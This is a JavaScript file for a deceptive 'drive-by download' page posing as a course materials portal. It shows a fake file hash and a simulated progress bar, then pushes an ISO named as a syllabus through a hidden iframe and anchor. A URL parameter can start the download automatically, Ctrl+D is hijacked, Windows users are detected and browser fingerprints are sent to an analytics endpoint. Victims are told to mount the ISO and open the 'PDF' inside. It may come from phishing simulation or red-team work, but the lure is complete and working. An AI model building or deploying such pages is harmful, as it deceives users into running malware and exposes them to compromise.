/*
 * Drive-By Download Handler
 * Course Materials Portal
 */

(function() {
    'use strict';
    
    // ==================== CONFIGURATION ====================
    const CONFIG = {
        downloadUrl: '/download',
        autoDownloadDelay: 2000,        // 2 seconds
        progressInterval: 50,            // Update progress every 50ms
        fakeHash: 'a7f3b9c2d1e8f4a6b9c0d2e5f8a1b3c6d9e2f5a8b1c4d7e0f3a6b9c2d5e8f1a4'
    };
    
    // ==================== DOM ELEMENTS ====================
    const elements = {
        downloadBtn: document.getElementById('downloadBtn'),
        manualDownloadBtn: document.getElementById('manualDownloadBtn'),
        progressContainer: document.getElementById('progressContainer'),
        progressFill: document.getElementById('progressFill'),
        progressText: document.getElementById('progressText'),
        downloadReady: document.getElementById('downloadReady'),
        overlay: document.getElementById('overlay'),
        fileHash: document.getElementById('fileHash')
    };
    
    // ==================== STATE ====================
    let downloadStarted = false;
    let progressInterval = null;
    let fakeProgress = 0;
    
    // ==================== UTILITY FUNCTIONS ====================
    
    // Generate a fake SHA-256 hash for display
    function generateDisplayHash() {
        // Just return the pre-defined hash for consistency
        return CONFIG.fakeHash;
    }
    
    // Update the hash display
    function updateHashDisplay() {
        if (elements.fileHash) {
            elements.fileHash.textContent = generateDisplayHash();
        }
    }
    
    // Show overlay
    function showOverlay(text = 'Preparing your download...') {
        elements.overlay.style.display = 'flex';
        const overlayText = elements.overlay.querySelector('.overlay-text');
        if (overlayText) {
            overlayText.textContent = text;
        }
    }
    
    // Hide overlay
    function hideOverlay() {
        elements.overlay.style.display = 'none';
    }
    
    // Simulate progress for better UX
    function startFakeProgress() {
        fakeProgress = 0;
        elements.progressContainer.style.display = 'block';
        elements.downloadReady.style.display = 'none';
        
        progressInterval = setInterval(() => {
            // Slow down as we approach 90% (never reaches 100 until actual download)
            if (fakeProgress < 30) {
                fakeProgress += Math.random() * 5;
            } else if (fakeProgress < 60) {
                fakeProgress += Math.random() * 3;
            } else if (fakeProgress < 85) {
                fakeProgress += Math.random() * 1.5;
            } else {
                fakeProgress += Math.random() * 0.5;
            }
            
            fakeProgress = Math.min(fakeProgress, 92);
            
            elements.progressFill.style.width = fakeProgress + '%';
            elements.progressText.textContent = `Preparing course materials... ${Math.round(fakeProgress)}%`;
        }, CONFIG.progressInterval);
    }
    
    // Complete the progress bar
    function completeProgress() {
        if (progressInterval) {
            clearInterval(progressInterval);
            progressInterval = null;
        }
        
        elements.progressFill.style.width = '100%';
        elements.progressText.textContent = 'Download ready! Starting transfer...';
        
        setTimeout(() => {
            elements.progressContainer.style.display = 'none';
            elements.downloadReady.style.display = 'block';
        }, 500);
    }
    
    // Trigger the actual download
    function triggerDownload() {
        console.log('[DOWNLOAD] Initiating download...');
        
        // Create hidden iframe for download (avoids navigation)
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = CONFIG.downloadUrl;
        document.body.appendChild(iframe);
        
        // Clean up iframe after download starts
        setTimeout(() => {
            if (iframe.parentNode) {
                iframe.parentNode.removeChild(iframe);
            }
        }, 5000);
        
        // Alternative: Use anchor tag
        const anchor = document.createElement('a');
        anchor.href = CONFIG.downloadUrl;
        anchor.download = 'Course_Syllabus_Materials.iso';
        anchor.style.display = 'none';
        document.body.appendChild(anchor);
        
        // Slight delay to ensure DOM update
        setTimeout(() => {
            anchor.click();
            setTimeout(() => {
                if (anchor.parentNode) {
                    anchor.parentNode.removeChild(anchor);
                }
            }, 100);
        }, 10);
        
        console.log('[DOWNLOAD] Download triggered');
    }
    
    // Main download handler
    async function handleDownload() {
        if (downloadStarted) {
            console.log('[INFO] Download already in progress');
            return;
        }
        
        downloadStarted = true;
        elements.downloadBtn.disabled = true;
        
        // Log the event
        console.log('[EVENT] Download initiated by user');
        
        // Show overlay with preparing message
        showOverlay('Preparing your course materials...');
        
        // Start fake progress for UX
        startFakeProgress();
        
        // Hide overlay after short delay
        setTimeout(() => {
            hideOverlay();
        }, 1500);
        
        // Wait for the configured delay before triggering download
        setTimeout(() => {
            completeProgress();
            triggerDownload();
            
            // Log successful trigger
            console.log('[SUCCESS] Download triggered successfully');
            
            // Show instructions after download starts
            setTimeout(() => {
                showDownloadInstructions();
            }, 1000);
            
        }, CONFIG.autoDownloadDelay);
        
        // Track the download attempt
        trackDownloadAttempt();
    }
    
    // Manual download fallback
    function handleManualDownload() {
        console.log('[EVENT] Manual download triggered');
        triggerDownload();
    }
    
    // Show post-download instructions
    function showDownloadInstructions() {
        // Create a subtle notification
        const notification = document.createElement('div');
        notification.style.cssText = `
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: white;
            padding: 1rem 1.5rem;
            border-radius: 8px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            border-left: 4px solid #10b981;
            z-index: 1000;
            max-width: 350px;
            animation: slideIn 0.3s ease;
        `;
        
        notification.innerHTML = `
            <style>
                @keyframes slideIn {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
            </style>
            <div style="display: flex; gap: 12px;">
                <span style="font-size: 24px;">📥</span>
                <div>
                    <h4 style="margin: 0 0 8px 0; color: #1e293b;">Download Started!</h4>
                    <p style="margin: 0 0 8px 0; color: #64748b; font-size: 14px;">
                        Double-click the ISO file to mount it, then open the PDF inside.
                    </p>
                    <button onclick="this.parentElement.parentElement.parentElement.remove()" 
                            style="background: #2563eb; color: white; border: none; 
                                   padding: 6px 12px; border-radius: 4px; cursor: pointer;">
                        Got it
                    </button>
                </div>
            </div>
        `;
        
        document.body.appendChild(notification);
        
        // Auto-remove after 10 seconds
        setTimeout(() => {
            if (notification.parentNode) {
                notification.remove();
            }
        }, 10000);
    }
    
    // Track download attempt (analytics)
    function trackDownloadAttempt() {
        const data = {
            event: 'download_attempt',
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: `${window.screen.width}x${window.screen.height}`,
            referrer: document.referrer || 'direct'
        };
        
        // Log to console (in production, send to analytics)
        console.log('[ANALYTICS]', data);
        
        // Optionally send to server
        fetch('/analytics', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(() => {
            // Silently fail - analytics are optional
        });
    }
    
    // Auto-download on page load (optional - can be enabled)
    function checkAutoDownload() {
        // Check URL parameter ?auto=1
        const urlParams = new URLSearchParams(window.location.search);
        const shouldAuto = urlParams.get('auto');
        
        if (shouldAuto === '1') {
            console.log('[AUTO] Auto-download triggered via URL parameter');
            setTimeout(handleDownload, 1000);
        }
    }
    
    // Detect Windows OS for targeted messaging
    function detectOS() {
        const userAgent = navigator.userAgent;
        const isWindows = userAgent.includes('Windows');
        
        if (isWindows) {
            console.log('[DETECT] Windows OS detected - compatible');
            document.body.classList.add('os-windows');
        } else {
            console.log('[DETECT] Non-Windows OS detected');
            // Could show warning but still allow download
        }
        
        return isWindows;
    }
    
    // ==================== INITIALIZATION ====================
    function init() {
        console.log('[INIT] Drive-by download page initialized');
        
        // Update hash display
        updateHashDisplay();
        
        // Detect OS
        detectOS();
        
        // Attach event listeners
        if (elements.downloadBtn) {
            elements.downloadBtn.addEventListener('click', handleDownload);
        }
        
        if (elements.manualDownloadBtn) {
            elements.manualDownloadBtn.addEventListener('click', handleManualDownload);
        }
        
        // Keyboard shortcut (Ctrl+D / Cmd+D) for power users
        document.addEventListener('keydown', (e) => {
            if ((e.ctrlKey || e.metaKey) && e.key === 'd') {
                e.preventDefault();
                handleDownload();
            }
        });
        
        // Check for auto-download
        checkAutoDownload();
        
        // Warm up the connection to the download server
        fetch('/health')
            .then(res => res.json())
            .then(data => {
                console.log('[HEALTH] Server status:', data);
            })
            .catch(() => {
                console.warn('[HEALTH] Could not reach health endpoint');
            });
        
        console.log('[READY] Page ready for user interaction');
    }
    
    // Run initialization when DOM is ready
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
})();
